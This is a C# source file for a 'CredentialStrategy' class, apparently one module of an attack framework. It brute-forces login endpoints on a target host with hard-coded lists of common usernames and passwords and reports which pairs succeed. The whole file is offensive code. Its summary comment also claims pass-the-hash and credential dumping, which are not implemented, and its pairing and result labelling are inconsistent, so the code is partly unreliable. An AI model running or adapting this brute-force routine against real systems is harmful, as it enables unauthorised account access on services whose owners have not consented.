using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Mockaco.Attack
{
    /// <summary>
    /// Credential-based attacks: brute force, pass-the-hash, credential dumping.
    /// Targets authentication services identified during recon.
    /// </summary>
    public sealed class CredentialStrategy : IAttackStrategy
    {
        private readonly AttackClient _client;
        private readonly ILogger<CredentialStrategy> _logger;
        private static readonly string[] CommonPasswords = {
            "password", "admin", "root", "toor", "123456", "letmein",
            "welcome", "monkey", "master", "qwerty", "login", "passw0rd"
        };
        private static readonly string[] CommonUsernames = {
            "admin", "root", "user", "test", "guest", "administrator",
            "service", "www", "ftp", "mysql", "postgres"
        };

        public CredentialStrategy(AttackClient client, ILogger<CredentialStrategy> logger)
        {
            _client = client;
            _logger = logger;
        }

        public AttackType Type => AttackType.Credential;

        public async Task PrepareAsync(AttackContext context, CancellationToken cancellationToken)
        {
            if (string.IsNullOrWhiteSpace(context.Parameters))
            {
                context.Parameters = BuildCredentialPayload(context);
            }
        }

        public async Task<AttackExecutionResult> ExecuteAsync(AttackContext context, CancellationToken cancellationToken)
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();

            try
            {
                var results = await BruteForceAsync(context, cancellationToken);

                sw.Stop();
                var success = results.Any(r => r);
                var foundCredentials = results.Count(r => r);

                _logger.LogInformation(
                    "Credential attack on {Host}:{Port} ({Service}) found {Credentials}/{Tries} valid ({Elapsed:F2}s)",
                    context.IpAddress, context.Port, context.Service,
                    foundCredentials, results.Count, sw.Elapsed.TotalSeconds);

                return new AttackExecutionResult
                {
                    Success = success,
                    Message = $"{foundCredentials} valid credentials found for {context.Service}",
                    Response = string.Join("\n", results.Select((r, i) =>
                        $"{CommonUsernames[i % CommonUsernames.Length]}:{CommonPasswords[i % CommonPasswords.Length]} = {r}")),
                    Elapsed = sw.Elapsed
                };
            }
            catch (Exception ex)
            {
                sw.Stop();
                _logger.LogError(ex, "Credential attack failed for {Host}:{Port}", context.IpAddress, context.Port);
                return new AttackExecutionResult
                {
                    Success = false,
                    Message = $"Credential attack failed on port {context.Port}",
                    ErrorMessage = ex.Message,
                    Elapsed = sw.Elapsed
                };
            }
        }

        private async Task<List<bool>> BruteForceAsync(AttackContext context, CancellationToken cancellationToken)
        {
            var results = new List<bool>();
            var payload = context.Parameters;

            for (var i = 0; i < CommonUsernames.Length && i < 20; i++)
            {
                var user = CommonUsernames[i];
                var pass = CommonPasswords[i];

                try
                {
                    var response = await _client.LaunchAttackAsync(
                        context.IpAddress,
                        "CredentialCheck",
                        "POST",
                        $"/api/auth/{context.Service.ToLowerInvariant()}",
                        $"user={user}&password={pass}&port={context.Port}",
                        cancellationToken);

                    results.Add(response.Contains("\"success\":true") || response.Contains("valid"));
                }
                catch
                {
                    results.Add(false);
                }
            }

            return results;
        }

        private string BuildCredentialPayload(AttackContext context)
        {
            var sb = new System.Text.StringBuilder();
            sb.AppendLine($"Service: {context.Service}");
            sb.AppendLine($"Port: {context.Port}");
            sb.AppendLine($"Target: {context.IpAddress}");
            sb.AppendLine("Use common username/password pairs for brute force.");
            return sb.ToString();
        }
    }
}
